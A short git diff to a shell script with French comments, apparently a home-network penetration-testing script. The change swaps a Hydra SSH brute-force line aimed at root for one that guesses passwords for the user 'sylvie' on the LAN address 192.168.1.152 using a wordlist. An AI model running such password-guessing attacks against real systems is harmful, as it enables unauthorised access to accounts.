@@ -38,7 +38,8 @@ echo "Testing SSH login with Hydra on $TARGET..."
 
 if [[ "$open_ports" =~ "22" ]]; then
     # Remplacez par le chemin de votre fichier de mots de passe ou une liste de mots de passe
-    hydra -t 2 -l root -P ~/smallwordlist.txt ssh://$TARGET
+    #hydra -t 2 -l root -P ~/smallwordlist.txt ssh://$TARGET
+    sudo hydra -l sylvie -P ~/smallwordlist.txt 192.168.1.152 -t 1 ssh
 
 else
     echo "Aucun service SSH trouvé, skipping Hydra SSH brute force test."
